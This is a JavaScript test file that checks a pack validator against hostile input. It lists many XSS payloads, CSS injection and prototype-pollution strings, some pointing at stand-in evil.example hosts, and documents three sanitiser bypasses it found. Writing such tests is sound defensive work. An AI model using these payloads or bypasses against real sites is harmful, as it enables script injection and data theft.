// QA: hostile pack.json files (SPEC §9 "data only", §13.2, §13.3). A pack comes from a file someone
// shared or a card's lorebook, so every trick that turns data into code must be refused by
// validatePack: script and other code-running tags, on* attributes, javascript:/vbscript:/data:
// document URLs hidden behind entities, whitespace or case, SVG, CSS loading or running anything,
// prototype-pollution keys, and JSON too big, too deep or not plain. Problems found are the
// test.todo entries at the end, named after what should happen.
import test from 'node:test';
import assert from 'node:assert/strict';
import { validatePack, checkScreens } from '../../../packs/validate.js';
import { checkPlain } from '../../../packs/safety.js';
import { LIMITS } from '../../../packs/limits.js';

const base = (extra = {}) => ({ id: 'evil', format: 4, kind: 'world', version: '1.0.0', requires: { suite: '^0.1' }, content: {}, ...extra });
// A world cast entry: the format 4 place for a picture (`image`) and a link; a hostile field in an item or a cast entry is the same value to the whole-value walls.
const withCast = extra => base({ content: { cast: [{ id: 'rat', name: 'Rat', role: 'companion', ...extra }] } });
const withNote = note => base({ content: { items: [{ name: 'Lure', note }] } });
// A pack's own top-level `screens` are not read at all (format 3 and 4), so a screen is held to the checks that still take screens (a data module's):
// the whole-value walls (checkPlain) and checkScreens. `run` checks a pack or a screen the same way.
const withScreen = screen => ({ __screens: [{ id: 'evil-board', mounts: ['tab'], template: '<div>ok</div>', ...screen }] });
function run(input) {
    if (!input.__screens) return validatePack(input);
    const errors = [...checkPlain(input.__screens)];
    checkScreens(input.__screens, 'evil', (code, path, message) => errors.push({ code, path, message }));
    return errors.length ? { ok: false, errors } : { ok: true };
}

// `code`, when given, is a pattern one of the errors must match: a format 4 pack that is refused for the wrong reason (a missing field) must not pass.
function refused(input, why, code) {
    const result = run(input);
    assert.equal(result.ok, false, `${why}: the pack must be refused, it was accepted`);
    assert.ok(result.errors.length >= 1);
    if (code) assert.ok(result.errors.some(error => code.test(error.code)), `${why}: expected an error matching ${code}, got ${result.errors.map(error => error.code).join(', ')}`);
    for (const error of result.errors) {
        assert.equal(typeof error.code, 'string');
        assert.equal(typeof error.message, 'string');
    }
    return result.errors;
}

test('sanity: the base pack and a plain item note are accepted', () => {
    assert.equal(validatePack(base()).ok, true);
    assert.equal(validatePack(withNote('A violet lure, slightly <worn> & bent.')).ok, true);
    assert.equal(run(withScreen({ css: '.board { color: red; background: url(https://example.com/a.png); }' })).ok, true);
});

const UNSAFE = /^UNSAFE_/;

const SCRIPT_TAGS = [
    '<script>alert(1)</script>',
    '<SCRIPT SRC=//evil.example/x.js></SCRIPT>',
    '<scr<script>ipt>alert(1)</script>',
    '< script >alert(1)</script>',
    '<script\n>alert(1)</script>',
    '</script><script>alert(1)</script>',
    '<iframe src="https://evil.example"></iframe>',
    '<iframe/srcdoc="<b>x</b>">',
    '<object data="x.swf"></object>',
    '<embed src="x.swf">',
    '<applet code="x">',
    '<link rel="stylesheet" href="https://evil.example/x.css">',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<base href="https://evil.example/">',
    '<style>body{display:none}</style>',
    '<frameset><frame src="x">',
    '<form action="https://evil.example/steal"><input name=a></form>',
    '<form method=post\n action=https://evil.example>',
];

const EVENT_ATTRS = [
    '<img src=x onerror=alert(1)>',
    '<IMG SRC=x ONERROR=alert(1)>',
    '<img src=x onerror =alert(1)>',
    '<img src=x onerror\n=alert(1)>',
    '<img/src/onerror=alert(1)>',
    '<img src="x"onerror="alert(1)">',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<body onpageshow=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<x \u000bonclick=alert(1)>',
    '<img src=x\fonerror=alert(1)>',
    '<a onmouseover="alert(1)">hover</a>',
    '<marquee onstart=alert(1)>',
];

const SCRIPT_URLS = [
    '<a href="javascript:alert(1)">x</a>',
    '<a href="JaVaScRiPt:alert(1)">x</a>',
    '<a href="  javascript:alert(1)">x</a>',
    '<a href="java\tscript:alert(1)">x</a>',
    '<a href="java\nscript:alert(1)">x</a>',
    '<a href="java\u0000script:alert(1)">x</a>',
    '<a href="jav&#x09;ascript:alert(1)">x</a>',
    '<a href="jav&#X09;ascript:alert(1)">x</a>',
    '<a href="jav&#9;ascript:alert(1)">x</a>',
    '<a href="&#106;&#97;vascript:alert(1)">x</a>',
    '<a href="&#0000106;avascript:alert(1)">x</a>',
    '<a href="&#x6A&#x61vascript:alert(1)">x</a>',
    '<a href="javascript&colon;alert(1)">x</a>',
    '<a href="javascript&#58;alert(1)">x</a>',
    '<a href="java&Tab;script:alert(1)">x</a>',
    '<a href="java&NewLine;script:alert(1)">x</a>',
    '<a href="vbscript:msgbox(1)">x</a>',
    '<a href="livescript:alert(1)">x</a>',
    '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    '<a href="DATA:TEXT/HTML;base64,PHNjcmlwdD4=">x</a>',
    '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
    '<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>',
    '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
    '<svg><use href="data:image/svg+xml,<svg id=x></svg>#x"/></svg>',
];

for (const [group, list] of [['code-running tag', SCRIPT_TAGS], ['event attribute', EVENT_ATTRS], ['script URL', SCRIPT_URLS]]) {
    test(`a ${group} anywhere in a pack's text is refused (${list.length} variants, 4 places each)`, () => {
        for (const payload of list) {
            refused(withNote(payload), `item note ${JSON.stringify(payload)}`, UNSAFE);
            refused(base({ description: payload }), `description ${JSON.stringify(payload)}`, UNSAFE);
            refused(withScreen({ template: `<div>${payload}</div>` }), `screen template ${JSON.stringify(payload)}`);
            refused(base({ content: { items: [{ name: 'Rat', lore: { text: [payload] } }] } }), `nested item text ${JSON.stringify(payload)}`, UNSAFE);
        }
    });
}

test('a field name can carry markup too: refused', () => {
    refused(base({ content: { items: [{ name: 'Rat', '<img src=x onerror=alert(1)>': 1 }] } }), 'markup in a key', UNSAFE);
});

test('image and link fields take only https or a raster data: image', () => {
    for (const bad of ['http://example.com/a.png', '//evil.example/a.png', 'javascript:alert(1)', 'data:image/svg+xml;base64,PHN2Zz4=',
        'data:text/html;base64,PGI+', 'https://exa mple.com/a.png', 'file:///etc/passwd', 'blob:https://x/1', '/relative.png', ' javascript:1']) {
        refused(withCast({ image: bad }), `image ${bad}`, UNSAFE);
        refused(base({ content: { items: [{ name: 'Rat', href: bad }] } }), `href ${bad}`, UNSAFE);
    }
    assert.equal(validatePack(withCast({ image: 'https://example.com/rat.png' })).ok, true);
    assert.equal(validatePack(withCast({ image: 'data:image/png;base64,iVBORw0KGgo=' })).ok, true);
});

const BAD_CSS = [
    '@import url(https://evil.example/x.css);',
    '@IMPORT "https://evil.example/x.css";',
    '@\\69mport "x.css";',
    '.a { background: url(javascript:alert(1)); }',
    '.a { background: url("javascript:alert(1)"); }',
    '.a { background: url( \'http://evil.example/a.png\' ); }',
    '.a { background: URL(http://evil.example/a.png); }',
    '.a { background: url(//evil.example/a.png); }',
    '.a { background: url(data:image/svg+xml;base64,PHN2Zz4=); }',
    '.a { background: url(data:text/html,<b>x</b>); }',
    '.a { width: expression(alert(1)); }',
    '.a { width: EXPRESSION (alert(1)); }',
    '.a { behavior: url(x.htc); }',
    '.a { -moz-binding: url(https://evil.example/x.xml#x); }',
    '.a { background: u\\72l(http://evil.example); }',
    '</style><script>alert(1)</script>',
    '.a { content: "\\3c script\\3e"; }',
];

test('screen CSS that loads, runs or escapes anything is refused', () => {
    for (const css of BAD_CSS) refused(withScreen({ css }), `css ${JSON.stringify(css)}`);
});

test('theme values are plain CSS values: no url(), expression(), braces, semicolons or backslashes', () => {
    for (const value of ['url(https://evil.example/a.png)', 'expression(alert(1))', 'red; } body { display: none', 'red}', '\\75rl(x)', '<b>', '@import x']) {
        refused(withScreen({ theme: { '--ss-accent': value } }), `screen theme ${JSON.stringify(value)}`);
    }
    for (const name of ['color', '--', '-x', '--X', '--a;b', 'background']) refused(withScreen({ theme: { [name]: 'red' } }), `screen theme name ${name}`);
    // A pack's own top-level theme is not read in format 4: it is refused as an unknown field, not applied.
    assert.ok(refused(base({ theme: { '--ss-accent': 'red' } }), 'a top-level theme').some(error => error.code === 'UNKNOWN_FIELD'));
});

test('prototype-pollution keys are refused wherever they are, and nothing is polluted', () => {
    const texts = [
        '{"id":"evil","format":4,"kind":"world","version":"1.0.0","requires":{"suite":"^0.1"},"__proto__":{"polluted":1}}',
        '{"id":"evil","format":4,"kind":"world","version":"1.0.0","requires":{"suite":"^0.1"},"content":{"items":[{"name":"x","__proto__":{"polluted":1}}]}}',
        '{"id":"evil","format":4,"kind":"world","version":"1.0.0","requires":{"suite":"^0.1"},"content":{"items":[{"name":"x","stats":{"constructor":{"prototype":{"polluted":1}}}}]}}',
        '{"id":"evil","format":4,"kind":"world","version":"1.0.0","requires":{"suite":"^0.1"},"content":{"start":{"inventory":{"prototype":1}}}}',
    ];
    for (const text of texts) {
        refused(text, `text ${text}`, /^UNSAFE_KEY$/);
        refused(JSON.parse(text), `parsed ${text}`, /^UNSAFE_KEY$/);
    }
    assert.equal(({}).polluted, undefined);
    assert.equal(Object.prototype.polluted, undefined);
});

test('JSON that is huge, deep, wide or long is refused without a crash', () => {
    const deepText = `{"id":"evil","format":4,"kind":"world","version":"1.0.0","requires":{"suite":"^0.1"},"content":{"items":[{"name":"x","lore":${'['.repeat(20000)}${']'.repeat(20000)}}]}}`;
    refused(deepText, 'nesting 20000 deep (text)', /^TOO_DEEP$/);
    let deep = {};
    const root = deep;
    for (let i = 0; i < 5000; i++) deep = (deep.x = {});
    refused(base({ content: { items: [{ name: 'x', lore: root }] } }), 'nesting 5000 deep (object)', /^TOO_DEEP$/);
    refused('{"id":"evil","pad":"' + 'a'.repeat(LIMITS.packBytes) + '"}', 'larger than packBytes', /^TOO_LARGE$/);
    refused(base({ description: 'a'.repeat(LIMITS.string + 1) }), 'a string longer than the limit', /^TOO_LONG$/);
    refused(base({ content: { items: [{ name: 'x', lore: Array.from({ length: LIMITS.array + 1 }, () => 1) }] } }), 'an array past the limit', /^TOO_MANY$/);
    refused(base({ content: { items: [{ name: 'x', lore: Object.fromEntries(Array.from({ length: LIMITS.keys + 1 }, (_, i) => [`k${i}`, 1])) }] } }), 'an object with too many keys', /^TOO_MANY$/);
    refused(base({ content: { items: [{ name: 'x', [`k${'y'.repeat(LIMITS.name + 1)}`]: 1 }] } }), 'a field name longer than the limit', /^TOO_LONG$/);
    // Multi-byte text counts in bytes, not characters.
    refused('{"id":"evil","pad":"' + '\u{1F600}'.repeat(Math.ceil(LIMITS.packBytes / 4) + 10) + '"}', 'larger than packBytes in UTF-8', /^TOO_LARGE$/);
});

test('values JSON cannot hold are refused when the pack is given as an object', () => {
    const cyclic = base();
    cyclic.content = { items: [{ name: 'x' }] };
    cyclic.content.items[0].self = cyclic.content.items[0];
    const getter = base();
    Object.defineProperty(getter, 'description', { enumerable: true, get() { throw new Error('a getter ran'); } });
    class Fancy { constructor() { this.name = 'x'; } }
    const cases = [
        ['NaN', base({ content: { items: [{ name: 'x', value: NaN }] } })],
        ['Infinity', base({ content: { items: [{ name: 'x', value: Infinity }] } })],
        ['a function', base({ content: { items: [{ name: 'x', note: () => 'x' }] } })],
        ['undefined', base({ content: { items: [{ name: 'x', note: undefined }] } })],
        ['a symbol value', base({ content: { items: [{ name: 'x', note: Symbol('x') }] } })],
        ['a symbol key', base({ content: { items: [{ name: 'x', [Symbol('k')]: 1 }] } })],
        ['a bigint', base({ content: { items: [{ name: 'x', value: 10n }] } })],
        ['a Date', base({ content: { items: [{ name: 'x', note: new Date(0) }] } })],
        ['a Map', base({ content: { items: [{ name: 'x', stats: new Map([['a', 1]]) }] } })],
        ['a class instance', base({ content: { items: [new Fancy()] } })],
        ['a cycle', cyclic],
        ['a getter', getter],
    ];
    for (const [what, value] of cases) refused(value, what);
});

test('not a pack at all: refused with a plain reason', () => {
    for (const input of ['', '   ', '﻿', 'null', '[]', '"pack"', '42', '{', '{"id":', 'NaN', '{"id":"evil",}', '<script>alert(1)</script>']) {
        refused(input, `input ${JSON.stringify(input)}`);
    }
});

// ---- problems found (each a failing check, kept as a todo so CI stays green) -----------------

const accepted = input => run(input).ok === true;

test('packs/safety.js EVENT_ATTR: an event attribute after a quoted ">" (<img alt=">" src=x onerror=alert(1)>) is refused', () => {
    // EVENT_ATTR is /<[a-z][^>]*?[\s"'/]on[a-z]+\s*=(?!=)/: [^>] stops at the ">" inside the quoted alt
    // value, so the onerror that follows is never seen. A browser parses alt=">" as one attribute and
    // runs onerror. The template sanitiser (view/template) drops it when the text is drawn as a template;
    // this is the second wall, and it promises "no on* attributes" for every string of a pack.
    assert.equal(accepted(withNote('<img alt=">" src=x onerror=alert(1)>')), false);
    assert.equal(accepted(withNote('<img alt=\'>\' src=x onerror=alert(1)>')), false);
    assert.equal(accepted(withScreen({ template: '<div><img title="a>b" src=x onerror=alert(1)></div>' })), false);
});

test('packs/validate.js unsafeCss: image-set() and -webkit-image-set() may load only https or image data URLs', () => {
    // CSS_URL only looks inside url(); image-set("http://…" 1x) loads a URL without url().
    assert.equal(accepted(withScreen({ css: '.a { background-image: image-set("http://evil.example/a.png" 1x); }' })), false);
    assert.equal(accepted(withScreen({ css: '.a { background-image: -webkit-image-set("//evil.example/a.png" 1x); }' })), false);
});

test('packs/safety.js CODE_SCHEME: a link to a data: document (data:application/xhtml+xml, data:text/xml) is refused', () => {
    assert.equal(accepted(withNote('<a href="data:application/xhtml+xml;base64,PHNjcmlwdD4=">x</a>')), false);
    assert.equal(accepted(withScreen({ template: '<a href="data:text/xml,<x/>">x</a>' })), false);
});
